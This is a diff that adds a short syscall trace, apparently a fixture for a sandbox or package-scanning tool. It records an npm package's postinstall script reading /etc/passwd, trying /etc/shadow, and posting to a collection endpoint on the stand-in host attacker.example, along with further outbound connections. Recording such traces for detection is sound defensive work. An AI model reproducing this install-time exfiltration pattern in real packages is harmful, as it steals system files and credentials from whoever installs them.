@@ -1,0 +1,13 @@
+5001  execve("/usr/bin/node", ["node", "/sandbox/node_modules/exfil-pkg/postinstall.js"], 0x7ffd5e8e7e60 /* 10 vars */) = 0
+5001  openat(AT_FDCWD, "/sandbox/node_modules/exfil-pkg/index.js", O_RDONLY) = 3
+5001  openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 4
+5001  openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES
+5001  openat(AT_FDCWD, "/sandbox/node_modules/exfil-pkg/.cache", O_WRONLY|O_CREAT, 0644) = 5
+5001  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
+5001  connect(6, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("45.33.32.156")}, 16) = -1 EINPROGRESS
+5001  sendto(6, "POST /collect HTTP/1.1\r\nHost: attacker.example\r\n", 48, 0, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("45.33.32.156")}, 16) = 48
+5001  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 7
+5001  connect(7, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 0
+5001  sendto(7, "\x00\x1c\x01\x00", 4, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 4
+5001  socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP) = 8
+5001  connect(8, {sa_family=AF_INET6, sin6_port=htons(8443), sin6_addr=inet6_addr("2607:f8b0:4004:800::200e")}, 28) = -1 EINPROGRESS
